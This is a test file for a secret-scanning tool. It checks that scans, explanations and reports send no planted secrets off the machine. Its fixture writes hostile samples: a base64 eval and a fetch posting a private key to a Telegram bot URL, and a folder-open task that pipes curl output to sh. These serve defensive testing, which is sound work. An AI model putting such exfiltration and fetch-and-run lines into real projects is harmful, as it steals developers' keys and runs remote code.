import { afterAll, beforeAll, describe, expect, test, vi } from 'vitest';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { createOllamaProvider, OLLAMA_URL } from '../src/ai/ollama';
import { explainRecord } from '../src/ai/explain';
import { apiProvider } from '../src/ai/provider';
import { createClient } from '../src/api/client';
import { cloneAndScan } from '../src/commands/cloneAndScan';
import { DEFAULT_LIMITS } from '../src/config/settings';
import { extractIndicators } from '../src/engine/indicators';
import type { EngineResult, Finding } from '../src/engine/types';
import { registerWatchers, type RootInfo } from '../src/guard/watchers';
import { Registry, type KeyValueStore, type ScanRecord } from '../src/quarantine/registry';
import { scanJob } from '../src/scan/scanJob';
import { ctx } from './engine/load';
import { recorder, reply, type Call } from './api/helpers';

// I-6, I-7 (blueprint: source code never leaves the machine). Every flow that can talk to a server runs against a repository full of
// planted secrets while a recording fetch watches the wire. Nothing planted may appear in any request, no snippet may be longer than 300
// characters, and every request must go to the one origin the user configured (or, for the local model, to loopback).

const API = 'https://api.stack3.test';
const KEY = '9c'.repeat(32);
const KEY2 = '5d'.repeat(32); // inside a flagged snippet, so only the redactor can keep it off the wire
const MNEMONIC = [...Array<string>(11).fill('abandon'), 'about'].join(' ');
const CANARY = 'CANARY-7f3a9e51-do-not-send';
const BOT_TOKEN = '123456789:AAFAKEtokenFAKEtokenFAKEtokenFAKEtoken1';
const WALLET = '0x9f00000000000000000000000000000000000001';
const FILLER = 'x'.repeat(900); // a long line, so evidence has something to be cut from

const PLANTED = [KEY, KEY2, MNEMONIC, CANARY, BOT_TOKEN, 'AAFAKEtoken', 'abandon abandon', FILLER.slice(0, 400)];

const LOCK = {
  name: 'egress-fixture',
  version: '1.0.0',
  lockfileVersion: 3,
  requires: true,
  packages: {
    '': { name: 'egress-fixture', version: '1.0.0', dependencies: { lodash: '4.17.21' } },
    'node_modules/lodash': { version: '4.17.21', resolved: 'https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz', integrity: 'sha512-bbb' },
    'node_modules/semver': { version: '7.6.0', resolved: 'https://registry.npmjs.org/semver/-/semver-7.6.0.tgz', integrity: 'sha512-ccc' },
  },
};

let base: string;
let repo: string;

beforeAll(() => {
  base = mkdtempSync(join(tmpdir(), 'stack3-egress-'));
  repo = join(base, 'planted');
  mkdirSync(join(repo, '.vscode'), { recursive: true });
  writeFileSync(join(repo, '.env'), `PRIVATE_KEY=0x${KEY}\n# ${CANARY}\n`);
  writeFileSync(join(repo, 'notes.txt'), `${MNEMONIC}\n`);
  writeFileSync(join(repo, 'README.md'), `# Fixture\n${CANARY}\n`);
  writeFileSync(join(repo, 'util.js'), `// ${CANARY}\nexports.add = (a, b) => a + b;\n`);
  writeFileSync(
    join(repo, 'index.js'),
    [`const w = '${WALLET}';`, `eval(Buffer.from('Y29uc29sZS5sb2coMSk=', 'base64').toString());`, `fetch('https://api.telegram.org/bot${BOT_TOKEN}/sendMessage', { method: 'POST', body: process.env.PRIVATE_KEY + w });`, `// ${FILLER}`].join('\n'),
  );
  writeFileSync(
    join(repo, '.vscode', 'tasks.json'),
    JSON.stringify({ version: '2.0.0', tasks: [{ label: 'setup', type: 'shell', runOptions: { runOn: 'folderOpen' }, command: `curl -s -d key=${KEY2} http://127.0.0.1:9/never/setup.sh | sh # ${FILLER}` }] }, null, 2),
  );
  writeFileSync(join(repo, 'package.json'), JSON.stringify({ name: 'egress-fixture', version: '1.0.0', dependencies: { lodash: '4.17.21' } }));
  writeFileSync(join(repo, 'package-lock.json'), JSON.stringify(LOCK));
});

afterAll(() => rmSync(base, { recursive: true, force: true }));

const memory = (): KeyValueStore => {
  const m = new Map<string, unknown>();
  return { get: <V>(k: string, d: V) => (m.has(k) ? (m.get(k) as V) : d), update: async (k, v) => void m.set(k, v) };
};

/** A server that answers every endpoint with a valid body, and remembers what it was sent. */
const server = () =>
  recorder(() => reply({ findings: [] }), () => reply({ findings: [] }), () => reply({ findings: [] }), () => reply({ findings: [] }));
const answering = (calls: Call[]): typeof fetch =>
  (async (url, init) => {
    const u = String(url);
    const body = u.endsWith('/explain') ? { explanation: 'It runs a script when the folder opens.', fix: 'Delete the clone.' } : u.endsWith('/report') ? { accepted: 1 } : { findings: [] };
    calls.push({ url: u, init: init ?? {}, body: typeof init?.body === 'string' ? JSON.parse(init.body) : undefined });
    return reply(body);
  }) as typeof fetch;

const clientFor = (calls: Call[]) => createClient({ baseUrl: API, allowLocalhost: false, fetchImpl: answering(calls), clientVersion: '0.1.0' });

/** Every string anywhere in a JSON value, so a secret cannot hide in a key name or a nested array. */
function strings(v: unknown, out: string[] = []): string[] {
  if (typeof v === 'string') out.push(v);
  else if (Array.isArray(v)) v.forEach((x) => strings(x, out));
  else if (v && typeof v === 'object') for (const [k, x] of Object.entries(v)) (out.push(k), strings(x, out));
  return out;
}

function audit(calls: Call[], origin: string, label: string): void {
  expect(calls.length, `${label}: the flow made no request, so the audit proved nothing`).toBeGreaterThan(0);
  for (const c of calls) {
    expect(c.url.startsWith(origin), `${label}: ${c.url} is outside ${origin}`).toBe(true);
    const wire = JSON.stringify(c.body) + JSON.stringify(c.init.headers ?? {}) + c.url;
    for (const secret of PLANTED) expect(wire.includes(secret), `${label}: "${secret.slice(0, 20)}…" went to ${c.url}`).toBe(false);
    expect(wire.includes(base), `${label}: a local path went to ${c.url}`).toBe(false);
    // Snippets: evidence and titles of findings, wherever they sit in the body.
    const findings = (c.body as { findings?: Finding[] } | undefined)?.findings ?? [];
    expect(findings.length).toBeLessThanOrEqual(20);
    for (const f of findings) expect(f.evidence.length).toBeLessThanOrEqual(300);
    for (const s of strings(c.body)) expect(s.length, `${label}: a ${s.length}-character string went to ${c.url}`).toBeLessThanOrEqual(1000);
    // Nothing that identifies the user or the machine beyond the client name and version.
    const headers = Object.keys((c.init.headers ?? {}) as Record<string, string>).map((h) => h.toLowerCase());
    expect(headers.sort()).toEqual(['accept', 'content-type', 'x-stack3-client']);
    expect(c.init.credentials).toBe('omit');
    expect(c.init.redirect).toBe('error');
  }
}

async function scanFixture(): Promise<EngineResult> {
  return scanJob({ root: repo, ctx, limits: DEFAULT_LIMITS });
}

describe('the fixture really does hold the secrets (a test that finds nothing proves nothing)', () => {
  test('the scan flags the key, the phrase, the auto-run task and the exfiltration, and the evidence is masked', async () => {
    const r = await scanFixture();
    const ids = r.findings.map((f) => f.ruleId);
    expect(ids).toEqual(expect.arrayContaining(['secret.evm-key', 'secret.mnemonic', 'tasks.folder-open']));
    expect(r.purls).toContain('pkg:npm/lodash@4.17.21');
    expect(extractIndicators(r.findings).addresses).toContain(WALLET);
    const evidence = r.findings.map((f) => f.evidence).join('\n');
    expect(evidence).not.toContain(KEY);
    expect(evidence).not.toContain(MNEMONIC);
  });
});

describe('every flow, with a recording fetch', () => {
  test('clone and scan: only package URLs are sent', async () => {
    const calls: Call[] = [];
    const registry = new Registry(memory(), async () => undefined);
    const shown: ScanRecord[] = [];
    const r = await cloneAndScan('https://github.com/octo/planted', {
      makeDir: async () => repo,
      clone: async () => ({ ok: true, value: { sha: 'c'.repeat(40) } }),
      scan: scanFixture,
      client: clientFor(calls),
      registry,
      removeDir: async () => undefined,
      showPanel: (rec) => void shown.push(rec),
      showError: (m) => {
        throw new Error(m);
      },
    });
    expect(r.ok).toBe(true);
    audit(calls, API, 'clone');
    expect(calls.map((c) => new URL(c.url).pathname)).toEqual(['/scan-package']);
    expect(Object.keys(calls[0]!.body as object)).toEqual(['purls']);
    expect(shown).toHaveLength(1);
  });

  test('the file watcher: only package URLs it has not asked about, nothing else', async () => {
    const calls: Call[] = [];
    const root: RootInfo = { path: repo, name: 'planted' };
    const published: unknown[] = [];
    const d = registerWatchers(
      { subscriptions: [] },
      {
        roots: () => [root],
        scan: scanFixture,
        client: () => clientFor(calls),
        publish: (_r, v) => void published.push(v),
        clear: () => undefined,
        notify: () => undefined,
        watch: () => ({ dispose: () => undefined }),
        onRootsChanged: () => ({ dispose: () => undefined }),
        isTrusted: () => true,
        onTrusted: () => ({ dispose: () => undefined }),
        debounceMs: 5, // the scan reads real files, so this runs on real timers
      },
    );
    try {
      await vi.waitFor(() => expect(published.length).toBeGreaterThan(0), { timeout: 10_000 });
    } finally {
      d.dispose();
    }
    audit(calls, API, 'watcher');
    expect(calls.map((c) => new URL(c.url).pathname)).toEqual(['/scan-package']);
  });

  async function recordOf(): Promise<ScanRecord> {
    const registry = new Registry(memory(), async () => undefined);
    let rec: ScanRecord | undefined;
    await cloneAndScan('https://github.com/octo/planted', {
      makeDir: async () => repo,
      clone: async () => ({ ok: true, value: { sha: 'd'.repeat(40) } }),
      scan: scanFixture,
      client: clientFor([]),
      registry,
      removeDir: async () => undefined,
      showPanel: (r) => void (rec = r),
      showError: () => undefined,
    });
    return rec!;
  }

  test('explain through the Stack3 API: redacted findings only', async () => {
    const rec = await recordOf();
    const calls: Call[] = [];
    const posts: unknown[] = [];
    await explainRecord(rec, {
      settings: () => ({ explainMode: 'publicOnly', explainProvider: 'api', ollamaModel: 'm' }),
      providers: { ollama: () => createOllamaProvider({ model: 'm', fetchImpl: recorder().fetch }), api: () => apiProvider(clientFor(calls)) },
      post: (_id, msg) => void posts.push(msg),
    });
    audit(calls, API, 'explain/api');
    expect(calls.map((c) => new URL(c.url).pathname)).toEqual(['/explain']);
    expect((calls[0]!.body as { findings: unknown[] }).findings.length).toBeGreaterThan(0);
    expect(posts.length).toBeGreaterThan(0);
  });

  test('explain through the local model: loopback only', async () => {
    const rec = await recordOf();
    const calls: Call[] = [];
    const ollamaFetch = (async (url, init) => {
      calls.push({ url: String(url), init: init ?? {}, body: typeof init?.body === 'string' ? JSON.parse(init.body) : undefined });
      return reply({ message: { content: JSON.stringify({ explanation: 'It runs a script when the folder opens.', fix: 'Delete the clone.' }) } });
    }) as typeof fetch;
    await explainRecord(rec, {
      settings: () => ({ explainMode: 'always', explainProvider: 'ollama', ollamaModel: 'qwen2.5-coder:7b' }),
      providers: { ollama: (model) => createOllamaProvider({ model, fetchImpl: ollamaFetch }), api: () => apiProvider(clientFor([])) },
      post: () => undefined,
    });
    expect(calls).toHaveLength(1);
    expect(calls[0]!.url).toBe(`${OLLAMA_URL}/api/chat`);
    const wire = JSON.stringify(calls[0]!.body);
    for (const secret of PLANTED) expect(wire.includes(secret), `ollama: "${secret.slice(0, 20)}…" in the prompt`).toBe(false);
    expect(wire.includes(base)).toBe(false);
  });

  test('report: addresses and domains only, the bot token is gone', async () => {
    const r = await scanFixture();
    const calls: Call[] = [];
    const out = await clientFor(calls).report({ indicators: extractIndicators(r.findings), source: { type: 'repo', id: 'github.com/octo/planted@ddddddd' }, ruleIds: r.findings.map((f) => f.ruleId) });
    expect(out.ok).toBe(true);
    audit(calls, API, 'report');
    expect(calls.map((c) => new URL(c.url).pathname)).toEqual(['/report']);
    expect(Object.keys(calls[0]!.body as object).sort()).toEqual(['indicators', 'ruleIds', 'source']);
    expect(JSON.stringify(calls[0]!.body)).toContain(WALLET);
  });

  test('an API origin that is not configured sends nothing at all', async () => {
    const calls: Call[] = [];
    const c = createClient({ baseUrl: '', allowLocalhost: false, fetchImpl: answering(calls) });
    expect((await c.scanPackage(['pkg:npm/lodash@4.17.21'])).ok).toBe(false);
    expect((await c.report({ indicators: { addresses: [WALLET], domains: [] }, ruleIds: [] })).ok).toBe(false);
    expect(calls).toEqual([]);
  });
});
